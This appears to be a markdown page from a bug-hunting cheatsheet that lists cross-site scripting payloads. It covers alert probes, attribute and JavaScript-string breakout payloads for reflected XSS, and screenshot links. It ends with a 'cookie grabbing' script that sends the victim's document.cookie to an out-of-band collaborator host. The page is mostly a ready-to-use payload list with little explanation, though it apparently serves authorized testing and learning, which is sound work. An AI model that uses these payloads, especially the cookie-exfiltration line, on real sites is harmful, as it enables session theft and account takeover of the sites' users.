# Testing Alert
```js
<script>alert(1337)</script>
```
![Screenshot from 2024-06-22 21-24-55](https://github.com/cyb0rg71/Bug-Hunting-Cheatsheet/assets/118939850/a4b3b27e-3e78-438e-90c1-38f3986f5a79)
```js
<svg/ onload=alert(1337)//
```
![Screenshot from 2024-06-22 21-30-13](https://github.com/cyb0rg71/Bug-Hunting-Cheatsheet/assets/118939850/cd6ea4c0-17df-448a-bc1a-caa4d293ee80)
```js
<Svg/OnLoad=(confirm)(1337)<!--
```
![Screenshot from 2024-06-22 21-34-37](https://github.com/cyb0rg71/Bug-Hunting-Cheatsheet/assets/118939850/2938507e-12e8-438d-ad7d-d1ec7d65a963)
```js
">cyborg71<script>alert(1337)</script>
```
![Screenshot from 2024-06-22 21-36-45](https://github.com/cyb0rg71/Bug-Hunting-Cheatsheet/assets/118939850/06045884-2e15-4998-bfe6-057cf34dbe92)
```js
<img src=x onerror=alert(1337)>
```
![Screenshot from 2024-06-22 21-38-04](https://github.com/cyb0rg71/Bug-Hunting-Cheatsheet/assets/118939850/925458b2-619b-4545-a675-81ee043cd00c)
#### For testing.
```js
"><h1>cyborg.71</h1>
<script onclick="alert(1337)">
<a href="javascript:alert('XSS')">Click me</a>
<img src=https://i.imgflip.com/8uo0t9.jpg>
```
# Reflected XSS into attribute with angle brackets HTML-encoded
Inject ```<xss123>'"``` and see if the angle ```<>``` brackets are encoded with ```&lt;``` and ```&gt;```.
  ![Screenshot from 2024-06-12 22-48-00](https://github.com/cyb0rg71/Bug-Hunting-Cheatsheet/assets/118939850/4bb3d36b-cef6-49ae-ab0d-a4c6ad9c8553)<br>
If this is the case, you should inject this payloads. 
```js
" onclick="alert(1337)
" autofocus="alert(1337)
" autofocus onfocus="alert(1337)
"onmouseover="alert(1)
```
![Screenshot from 2024-06-22 22-10-29](https://github.com/cyb0rg71/Bug-Hunting-Cheatsheet/assets/118939850/5f0c53d6-0489-483d-a82d-373456ee9233)
# Reflected XSS into a JavaScript string with angle brackets HTML encoded
Inject ```<xss123>'"``` and see if your payload encoded in a javascript code.<br>
![Screenshot from 2024-06-13 00-19-30](https://github.com/cyb0rg71/Bug-Hunting-Cheatsheet/assets/118939850/9180969c-2299-4adf-9c4a-a05e97629938)<br>
In this case you should try this payload to braek the code to inject maliciuos payload.
```js
xss';alert(1);'xss
'-alert(1)-'
```
Finally the code will look like this after response.
![image](https://github.com/cyb0rg71/Bug-Hunting-Cheatsheet/assets/118939850/8a708c31-a6c9-43d0-946e-09e7af240dbe)

#### For cookie grabbing.
```js
<script>document.location='https://r91uwnam29s3c1jdsyc8t7t34ualyfm4.oastify.com//'+document.cookie</script> 
```
